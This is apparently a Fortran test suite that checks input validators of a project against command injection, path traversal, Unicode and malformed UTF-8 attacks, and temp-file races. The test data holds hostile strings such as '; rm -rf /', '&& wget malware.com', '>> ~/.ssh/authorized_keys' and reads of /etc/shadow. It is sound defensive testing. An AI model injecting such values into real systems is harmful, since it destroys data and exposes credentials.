program test_issue_121_security_vulnerabilities
    !! Comprehensive security test suite for Issue #121 - Command Injection Vulnerabilities
    !! 
    !! This test suite validates protection against specific attack vectors identified
    !! in Issue #121:
    !! 1. Shell injection in find_files patterns
    !! 2. Unicode normalization attacks
    !! 3. Race condition testing for temporary files
    !! 4. Command injection penetration testing
    !! 5. Fuzzing tests with malformed UTF-8
    !! 6. Path injection protection
    !! 7. Symlink attack prevention
    
    use secure_command_executor
    use unicode_secure_validator
    use atomic_temp_file_manager
    use error_handling
    implicit none
    
    integer :: test_count = 0
    integer :: passed_count = 0
    logical :: all_passed = .true.
    
    print *, "=== Issue #121 Security Vulnerability Test Suite ==="
    print *, ""
    
    ! Execute comprehensive security tests for Issue #121
    call test_shell_injection_in_find_files()
    call test_unicode_normalization_attacks()
    call test_temp_file_race_conditions()
    call test_command_injection_penetration()
    call test_malformed_utf8_fuzzing()
    call test_path_injection_protection()
    call test_symlink_attack_prevention()
    call test_edge_case_attack_vectors()
    call test_combined_attack_scenarios()
    
    ! Print final results
    print *, ""
    print *, "=== Issue #121 Test Results ==="
    print '(A,I0)', "Tests Passed: ", passed_count
    print '(A,I0)', "Tests Failed: ", test_count - passed_count
    print '(A,I0)', "Total Tests: ", test_count
    
    if (all_passed) then
        print *, "OVERALL: PASSED - Issue #121 vulnerabilities are mitigated"
        stop 0
    else
        print *, "OVERALL: FAILED - Issue #121 vulnerabilities remain"
        stop 1
    end if
    
contains

    subroutine test_shell_injection_in_find_files()
        !! Test shell injection vulnerabilities in file finding operations
        !! Addresses Issue #121 finding: "Shell Injection in find_files"
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: files(:)
        
        call start_test("Shell Injection in find_files")
        
        ! Given: Malicious file patterns with shell injection attempts
        ! When: Finding files with injection patterns
        ! Then: Should block all injection attempts
        
        ! Test 1: Command chaining injection
        call safe_find_files("*.gcov; rm -rf /important", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Command chaining injection not blocked")
            return
        end if
        
        ! Test 2: Pipe injection
        call safe_find_files("*.gcov | cat /etc/passwd", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Pipe injection not blocked")
            return
        end if
        
        ! Test 3: Command substitution with backticks
        call safe_find_files("*.gcov`whoami`", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Backtick injection not blocked")
            return
        end if
        
        ! Test 4: Command substitution with $()
        call safe_find_files("*.gcov$(id)", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Dollar-paren injection not blocked")
            return
        end if
        
        ! Test 5: Directory traversal injection
        call safe_find_files("../../../etc/*.conf", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Directory traversal not blocked")
            return
        end if
        
        ! Test 6: Environment variable injection
        call safe_find_files("*.gcov$IFS", files, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Environment variable injection not blocked")
            return
        end if
        
        call pass_test()
    end subroutine test_shell_injection_in_find_files

    subroutine test_unicode_normalization_attacks()
        !! Test Unicode normalization and encoding attacks
        !! Addresses Issue #121 finding: "Incomplete Unicode Handling"
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path
        character(len=100) :: attack_path
        
        call start_test("Unicode Normalization Attacks")
        
        ! Given: Various Unicode attack patterns
        ! When: Validating paths with Unicode attacks
        ! Then: Should detect and block all attack patterns
        
        ! Test 1: RTL override attack (Issue #121 specific)
        ! Construct "file" + RTL override + "rm -rf /"
        attack_path = "file" // char(226) // char(128) // char(174) // "rm -rf /"
        call validate_path_unicode_safe(attack_path, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("RTL override attack not detected")
            return
        end if
        
        ! Test 2: PDF override attack
        attack_path = "file" // char(226) // char(128) // char(173) // "malicious"
        call validate_path_unicode_safe(attack_path, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("PDF override attack not detected")
            return
        end if
        
        ! Test 3: Zero-width space injection
        attack_path = "file" // char(226) // char(128) // char(139) // "hidden.txt"
        call validate_path_unicode_safe(attack_path, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Zero-width space attack not detected")
            return
        end if
        
        ! Test 4: Overlong UTF-8 encoding attack
        ! Invalid overlong encoding for NULL character
        attack_path = "file" // char(192) // char(128) // ".txt"
        call validate_path_unicode_safe(attack_path, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Overlong UTF-8 encoding not detected")
            return
        end if
        
        ! Test 5: Mixed script confusable attack
        ! Cyrillic 'a' that looks like Latin 'a'
        attack_path = "test_" // char(208) // char(176) // ".txt"
        call validate_path_unicode_safe(attack_path, safe_path, error_ctx)
        ! Note: This might be acceptable for MVP, but test should document behavior
        if (error_ctx%error_code == ERROR_SUCCESS) then
            print *, "  INFO: Mixed script characters accepted (expected for MVP)"
        else
            print *, "  INFO: Mixed script confusable detected and blocked"
        end if
        
        call pass_test()
    end subroutine test_unicode_normalization_attacks

    subroutine test_temp_file_race_conditions()
        !! Test temporary file race condition vulnerabilities
        !! Addresses Issue #121 finding: "Race Conditions in Temp Files"
        
        type(secure_temp_file_t) :: temp_file1, temp_file2, temp_file3
        type(error_context_t) :: error_ctx1, error_ctx2, error_ctx3
        logical :: success1, success2, success3
        character(len=1024) :: filename1, filename2, filename3
        
        call start_test("Temporary File Race Conditions")
        
        ! Given: Multiple simultaneous temp file creation attempts
        ! When: Creating temp files concurrently
        ! Then: Should prevent race conditions and create unique files
        
        ! Test 1: Concurrent creation should produce unique files
        call temp_file1%create_secure(error_ctx1, success1)
        call temp_file2%create_secure(error_ctx2, success2)
        call temp_file3%create_secure(error_ctx3, success3)
        
        if (.not. success1 .or. .not. success2 .or. .not. success3) then
            call fail_test("Concurrent temp file creation failed")
            call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
            return
        end if
        
        ! Test 2: Verify filenames are unique (prevent race conditions)
        call temp_file1%get_filename(filename1)
        call temp_file2%get_filename(filename2)
        call temp_file3%get_filename(filename3)
        
        if (trim(filename1) == trim(filename2) .or. &
            trim(filename1) == trim(filename3) .or. &
            trim(filename2) == trim(filename3)) then
            call fail_test("Race condition: duplicate temp filenames created")
            call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
            return
        end if
        
        ! Test 3: Verify atomic creation (no time gap)
        if (.not. temp_file1%is_atomic_creation() .or. &
            .not. temp_file2%is_atomic_creation() .or. &
            .not. temp_file3%is_atomic_creation()) then
            call fail_test("Non-atomic temp file creation detected")
            call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
            return
        end if
        
        ! Test 4: Verify exclusive creation flags were used
        if (.not. temp_file1%used_exclusive_creation() .or. &
            .not. temp_file2%used_exclusive_creation() .or. &
            .not. temp_file3%used_exclusive_creation()) then
            call fail_test("Exclusive creation flags not used - race condition vulnerability")
            call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
            return
        end if
        
        ! Test 5: Verify symlink following is prevented
        if (.not. temp_file1%prevents_symlink_following() .or. &
            .not. temp_file2%prevents_symlink_following() .or. &
            .not. temp_file3%prevents_symlink_following()) then
            call fail_test("Symlink following not prevented - security vulnerability")
            call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
            return
        end if
        
        call cleanup_temp_files(temp_file1, temp_file2, temp_file3)
        call pass_test()
    end subroutine test_temp_file_race_conditions

    subroutine test_command_injection_penetration()
        !! Comprehensive command injection penetration testing
        !! Addresses Issue #121 finding: "Command injection penetration testing"
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path, safe_executable
        character(len=200), dimension(15) :: injection_vectors
        integer :: i
        
        call start_test("Command Injection Penetration")
        
        ! Given: Comprehensive set of command injection attack vectors
        ! When: Testing path and executable validation
        ! Then: Should block all injection attempts
        
        ! Define comprehensive injection attack vectors
        injection_vectors(1) = "file; rm -rf /"
        injection_vectors(2) = "file && wget malware.com"
        injection_vectors(3) = "file || cat /etc/shadow"
        injection_vectors(4) = "file | sudo su"
        injection_vectors(5) = "file > /etc/hosts"
        injection_vectors(6) = "file >> ~/.ssh/authorized_keys"
        injection_vectors(7) = "file`id`"
        injection_vectors(8) = "file$(whoami)"
        injection_vectors(9) = "file${IFS}payload"
        injection_vectors(10) = "file'echo malicious'"
        injection_vectors(11) = 'file"echo malicious"'
        injection_vectors(12) = "file\nrm file"
        injection_vectors(13) = "file\trm file"
        injection_vectors(14) = "file" // char(0) // "hidden"
        injection_vectors(15) = "file\x41\x41\x41"  ! Hex encoding attempt
        
        ! Test path validation against all injection vectors
        do i = 1, 15
            call validate_path_security(trim(injection_vectors(i)), safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Injection vector " // trim(int_to_string(i)) // &
                              " not blocked: " // trim(injection_vectors(i)))
                return
            end if
        end do
        
        ! Test executable validation against injection vectors
        do i = 1, 15
            call validate_executable_path(trim(injection_vectors(i)), safe_executable, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Executable injection vector " // trim(int_to_string(i)) // &
                              " not blocked: " // trim(injection_vectors(i)))
                return
            end if
        end do
        
        call pass_test()
    end subroutine test_command_injection_penetration

    subroutine test_malformed_utf8_fuzzing()
        !! Fuzzing tests with malformed UTF-8 sequences
        !! Addresses Issue #121 finding: "Fuzzing tests with malformed UTF-8"
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path
        character(len=50) :: malformed_utf8
        integer :: i
        
        call start_test("Malformed UTF-8 Fuzzing")
        
        ! Given: Various malformed UTF-8 sequences
        ! When: Validating paths with malformed UTF-8
        ! Then: Should detect and reject all malformed sequences
        
        ! Test 1: Invalid start bytes
        do i = 128, 191
            malformed_utf8 = "file" // char(i) // ".txt"
            call validate_path_unicode_safe(malformed_utf8, safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Invalid UTF-8 start byte not detected: " // &
                              trim(int_to_string(i)))
                return
            end if
        end do
        
        ! Test 2: Incomplete multibyte sequences
        malformed_utf8 = "file" // char(224) // ".txt"  ! Incomplete 3-byte sequence
        call validate_path_unicode_safe(malformed_utf8, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Incomplete multibyte sequence not detected")
            return
        end if
        
        ! Test 3: Invalid continuation bytes
        malformed_utf8 = "file" // char(224) // char(64) // char(128) // ".txt"
        call validate_path_unicode_safe(malformed_utf8, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Invalid continuation byte not detected")
            return
        end if
        
        ! Test 4: Overlong encoding sequence
        malformed_utf8 = "file" // char(192) // char(128) // ".txt"  ! Overlong NULL
        call validate_path_unicode_safe(malformed_utf8, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Overlong encoding not detected")
            return
        end if
        
        ! Test 5: Invalid 4-byte sequence start
        malformed_utf8 = "file" // char(248) // char(128) // char(128) // char(128) // ".txt"
        call validate_path_unicode_safe(malformed_utf8, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Invalid 4-byte sequence not detected")
            return
        end if
        
        call pass_test()
    end subroutine test_malformed_utf8_fuzzing

    subroutine test_path_injection_protection()
        !! Test comprehensive path injection protection
        !! Addresses Issue #121 finding: "Path injection protection"
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path
        character(len=200), dimension(10) :: path_injection_vectors
        integer :: i
        
        call start_test("Path Injection Protection")
        
        ! Given: Advanced path injection attack vectors
        ! When: Validating paths with complex injection attempts
        ! Then: Should block all path injection attempts
        
        ! Define advanced path injection vectors
        path_injection_vectors(1) = "../../../../etc/passwd"
        path_injection_vectors(2) = "..\\..\\..\\windows\\system32\\config\\sam"
        path_injection_vectors(3) = "/proc/self/environ"
        path_injection_vectors(4) = "file/../../../root/.ssh/id_rsa"
        path_injection_vectors(5) = "NUL:"  ! Windows device name
        path_injection_vectors(6) = "CON"   ! Windows device name
        path_injection_vectors(7) = "file\0hidden"  ! NULL byte injection
        path_injection_vectors(8) = repeat("../", 100) // "etc/passwd"  ! Deep traversal
        path_injection_vectors(9) = "/dev/urandom"  ! Unix device access
        path_injection_vectors(10) = "\\\\server\\share\\file"  ! UNC path
        
        ! Test path validation against all injection vectors
        do i = 1, 10
            call validate_path_security(trim(path_injection_vectors(i)), safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Path injection vector " // trim(int_to_string(i)) // &
                              " not blocked: " // trim(path_injection_vectors(i)))
                return
            end if
        end do
        
        ! Test extremely long paths (buffer overflow attempts)
        block
            character(len=8192) :: long_path
            long_path = repeat("A", 8192)
            call validate_path_security(long_path, safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Extremely long path not blocked")
                return
            end if
        end block
        
        call pass_test()
    end subroutine test_path_injection_protection

    subroutine test_symlink_attack_prevention()
        !! Test symlink attack prevention mechanisms
        !! Addresses Issue #121 finding: "Symlink attack prevention testing"
        
        type(secure_temp_file_t) :: temp_file
        type(error_context_t) :: error_ctx
        logical :: success
        character(len=1024) :: temp_filename
        
        call start_test("Symlink Attack Prevention")
        
        ! Given: Temporary file creation in potentially hostile environment
        ! When: Creating and using temporary files
        ! Then: Should prevent symlink following and TOCTOU attacks
        
        ! Test 1: Create secure temp file
        call temp_file%create_secure(error_ctx, success)
        if (.not. success) then
            call fail_test("Could not create secure temp file for symlink test")
            return
        end if
        
        ! Test 2: Verify symlink following is prevented
        if (.not. temp_file%prevents_symlink_following()) then
            call fail_test("Symlink following not prevented")
            call temp_file%cleanup()
            return
        end if
        
        ! Test 3: Verify exclusive creation was used (prevents TOCTOU)
        if (.not. temp_file%used_exclusive_creation()) then
            call fail_test("Exclusive creation not used - TOCTOU vulnerability")
            call temp_file%cleanup()
            return
        end if
        
        ! Test 4: Verify atomic creation (no time gap for attacks)
        if (temp_file%get_creation_time_gap() /= 0) then
            call fail_test("Non-atomic creation detected - race condition vulnerability")
            call temp_file%cleanup()
            return
        end if
        
        ! Test 5: Verify sufficient entropy in filename (prevents prediction)
        block
            integer :: entropy_bits
            call temp_file%get_entropy_bits(entropy_bits)
            if (entropy_bits < 64) then  ! Require at least 64 bits of entropy
                call fail_test("Insufficient entropy in temp filename - prediction vulnerability")
                call temp_file%cleanup()
                return
            end if
        end block
        
        ! Test 6: Verify platform-specific security features are used
        if (get_platform_is_unix()) then
            if (.not. temp_file%uses_unix_security_features()) then
                call fail_test("Unix security features not used")
                call temp_file%cleanup()
                return
            end if
        else
            if (.not. temp_file%uses_windows_security_features()) then
                call fail_test("Windows security features not used")
                call temp_file%cleanup()
                return
            end if
        end if
        
        call temp_file%cleanup()
        call pass_test()
    end subroutine test_symlink_attack_prevention

    subroutine test_edge_case_attack_vectors()
        !! Test edge case attack vectors specific to Issue #121
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path
        
        call start_test("Edge Case Attack Vectors")
        
        ! Given: Edge case attack patterns from Issue #121
        ! When: Testing boundary conditions and complex attacks
        ! Then: Should handle all edge cases securely
        
        ! Test 1: Empty string attacks
        call validate_path_security("", safe_path, error_ctx)
        if (error_ctx%error_code /= ERROR_SUCCESS .or. safe_path /= ".") then
            call fail_test("Empty path not handled correctly")
            return
        end if
        
        ! Test 2: Path with only dangerous characters
        call validate_path_security(";|&`$", safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Path of only dangerous characters not blocked")
            return
        end if
        
        ! Test 3: Mixed encoding attacks (ASCII + UTF-8)
        block
            character(len=100) :: mixed_encoding
            mixed_encoding = "file" // char(226) // char(128) // char(174) // "; rm -rf /"
            call validate_path_security(mixed_encoding, safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Mixed encoding attack not blocked")
                return
            end if
        end block
        
        ! Test 4: Repeated dangerous patterns
        call validate_path_security("../../../../../../../../../../../etc/passwd", safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Repeated traversal patterns not blocked")
            return
        end if
        
        ! Test 5: Case sensitivity attacks (if applicable)
        call validate_path_security("File; RM -RF /", safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Case variation attack not blocked")
            return
        end if
        
        call pass_test()
    end subroutine test_edge_case_attack_vectors

    subroutine test_combined_attack_scenarios()
        !! Test combined attack scenarios that use multiple techniques
        
        type(error_context_t) :: error_ctx
        character(len=:), allocatable :: safe_path
        character(len=200) :: combined_attack
        
        call start_test("Combined Attack Scenarios")
        
        ! Given: Sophisticated attacks combining multiple techniques
        ! When: Testing multi-vector attacks
        ! Then: Should detect and block complex attack patterns
        
        ! Test 1: Unicode + Command injection
        combined_attack = "file" // char(226) // char(128) // char(174) // "; rm -rf /"
        call validate_path_unicode_safe(combined_attack, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Unicode + command injection not blocked")
            return
        end if
        
        ! Test 2: Path traversal + Command injection
        combined_attack = "../../../etc/passwd; cat /etc/shadow"
        call validate_path_security(combined_attack, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Path traversal + command injection not blocked")
            return
        end if
        
        ! Test 3: Buffer overflow + Injection
        block
            character(len=5000) :: overflow_injection
            overflow_injection = repeat("A", 4000) // "; rm -rf /"
            call validate_path_security(overflow_injection, safe_path, error_ctx)
            if (error_ctx%error_code == ERROR_SUCCESS) then
                call fail_test("Buffer overflow + injection not blocked")
                return
            end if
        end block
        
        ! Test 4: Encoding bypass + injection
        combined_attack = "file\x3b\x20rm\x20-rf\x20/"  ! Hex encoded "; rm -rf /"
        call validate_path_security(combined_attack, safe_path, error_ctx)
        if (error_ctx%error_code == ERROR_SUCCESS) then
            call fail_test("Encoding bypass + injection not blocked")
            return
        end if
        
        call pass_test()
    end subroutine test_combined_attack_scenarios

    ! Test utilities

    subroutine start_test(test_name)
        character(len=*), intent(in) :: test_name
        test_count = test_count + 1
        print '(A,I0,A,A)', "Test ", test_count, ": ", test_name
    end subroutine start_test

    subroutine pass_test()
        passed_count = passed_count + 1
        print *, "  PASS"
    end subroutine pass_test

    subroutine fail_test(message)
        character(len=*), intent(in) :: message
        all_passed = .false.
        print *, "  FAIL: " // message
    end subroutine fail_test

    function int_to_string(int_val) result(str_val)
        integer, intent(in) :: int_val
        character(len=:), allocatable :: str_val
        character(len=32) :: temp_str
        
        write(temp_str, '(I0)') int_val
        str_val = trim(temp_str)
    end function int_to_string

    subroutine cleanup_temp_files(temp_file1, temp_file2, temp_file3)
        type(secure_temp_file_t), intent(inout) :: temp_file1, temp_file2, temp_file3
        
        call temp_file1%cleanup()
        call temp_file2%cleanup() 
        call temp_file3%cleanup()
    end subroutine cleanup_temp_files

end program test_issue_121_security_vulnerabilities